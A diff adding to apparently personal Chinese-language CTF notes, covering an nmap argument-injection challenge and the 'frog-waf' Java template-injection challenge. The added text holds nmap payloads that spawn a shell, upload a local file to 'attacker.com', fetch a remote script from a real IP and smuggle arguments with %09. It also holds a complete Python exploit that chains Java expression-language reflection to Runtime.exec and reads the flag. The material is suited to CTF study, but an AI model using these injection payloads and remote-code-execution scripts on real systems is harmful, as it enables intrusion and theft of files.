@@ -75,9 +75,41 @@ def escape_shell_input(input_string)
 其中空格可以用`%09`代替
 
 ---
+忘了上[gtfobin](https://gtfobins.github.io)查找了,,,
+nmap支持自定义脚本
+```shell
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+nmap --script=$TF
+```
 
+可以看到脚本内容支持python的os模块
+1. 上传文件到服务器(替换空格为%09)
+```shell
+RHOST=attacker.com
+RPORT=8080
+LFILE=file_to_send
+nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
+```
 
+payload1=`54.255.166.12:80%09--script%09http-fetch%09--script-args%09http-fetch.destination=/tmp,http-fetch.url=shell`
+2. 加载本地脚本
+```shell
+TF=$(mktemp)
+echo 'os.execute("cat /flag*")' > $TF
+nmap --script=$TF
+```
+payload2=`54.255.166.12:80%09--script=/tmp/54.255.166.12/80/shell`
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230829173140.png)
+
+---
+另一解法
+```shell
+service=127.0.0.1%3A30851%09-iL%09/flag-????????????????????????????????.txt%09-oN%09-%09
+```
+我记得我尝试过,但是没成功输出
 ### frog-waf
+#ssti/java
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230827194115.png)
 
 `addContact` -> 增加contact
@@ -97,6 +129,56 @@ public enum AttackTypes {
 
 还没看出来有啥漏洞,已经被waf防死了
 
+---
+先贴脚本
+```python
+import requests
+import json
+import re
+
+host = 'frog-waf.chals.sekai.team'
+
+N = json.loads(open('numbers.json').read())
+
+def send_payload(payload):
+    r = requests.post(f'http://{host}/addContact', json = {
+        "firstName": "Aaaa",
+        "lastName": "Aaaa",
+        "description": "Aaaa",
+        "country": payload.strip()
+    })
+    return r.json()['violations'][0]['message'].replace(' is not a valid country', '')
+
+def pwn(payload):
+    global N
+    payload = re.sub(r'\d+', lambda x: N[x.group(0)], payload)
+    return send_payload(f'${{ {payload} }}')
+
+def s(string):
+    r = ''
+    for i in range(len(string)):
+        r += f'{Character}.getMethods()[39].invoke(null,{ord(string[i])})[0].toString()'
+        if i != len(string) - 1:
+            r += '.concat('
+    r += ')' * (len(string) - 1)
+    return r
+
+true = '(null eq null)'
+String = f'{true}.toString().getClass()'
+Character = f'{String}.getMethods()[22].invoke({true}.toString(),0).getClass()'
+Class = f'{true}.getClass().getClass()'
+Runtime = f'{Class}.getMethods()[2].invoke(null,{s("java.lang.Runtime")})'
+Scanner = f'{Class}.getMethods()[2].invoke(null,{s("java.util.Scanner")})'
+
+cmd = "sh -c cat${IFS}/flag*"
+cmd_stream = f'{Runtime}.getMethods()[6].invoke(null).exec({s(cmd)}).getInputStream()'
+
+flag = pwn(f'{Scanner}.getConstructors()[1].newInstance({cmd_stream}).nextLine()')
+
+print(flag)
+```
+
+java的ssti
 
 # reverse
 #unity
